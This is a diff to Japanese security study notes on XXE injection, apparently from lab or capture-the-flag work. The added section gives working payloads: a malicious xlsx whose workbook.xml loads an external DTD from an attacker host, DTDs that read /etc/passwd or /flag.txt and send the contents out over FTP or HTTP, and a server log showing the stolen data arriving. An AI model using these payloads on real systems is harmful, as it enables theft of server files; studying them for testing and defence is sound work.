@@ -1,5 +1,8 @@
 # XXEインジェクション
 
+- `/product/1` のようなREST APIがあるとき、POSTリクエストだけxmlを要求する場合がある
+- xlsx ファイルをアップロードできる画面は要注意。実体はXMLが入ったZIPファイル。
+
 ## エンティティの種類
 ### 内部エンティティ
 ```xml
@@ -116,6 +119,55 @@ Intruder 等でポート部分を変更して送信する
   <message>test</message>
 </contact>
 ```
+
+## xlsx + Outbound
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md#xxe-inside-xlsx-file
+
+1. Officeなどでxlsxファイルを作る。
+2. 解凍
+
+```sh
+7z x -oXXE xxe.xlsx
+```
+
+3. xl/workbook.xml にペイロードを追加。
+
+```xml
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM "http://x.x.x.x:8000/xxe.dtd">%asd;%c;]>
+<cdl>&rrr;</cdl>
+<workbook xmlns="http...
+```
+
+4. xxe.dtd を作成（FTPの方が大きいファイルに対応できる）
+
+```xml
+<!ENTITY % d SYSTEM "file:///etc/passwd">
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'>">
+```
+
+```xml
+<!ENTITY % d SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'http://x.x.x.x:8000/%d;'>">
+```
+
+リクエストされるファイル名として、ファイルのコンテンツが送信される。
+
+```sh
+python -m http.server 
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.201.125.209 - - [22/Oct/2025 15:34:12] code 404, message File not found
+10.201.125.209 - - [22/Oct/2025 15:34:12] "GET /e2Q2Yj[REDACTED]A3ZDhmfQo= HTTP/1.0" 404 -
+```
+
+5. 圧縮、アップロード
+
+```sh
+cd XXE
+7z u ../xxe.xlsx *
+```
+
 
 ## 緩和
 
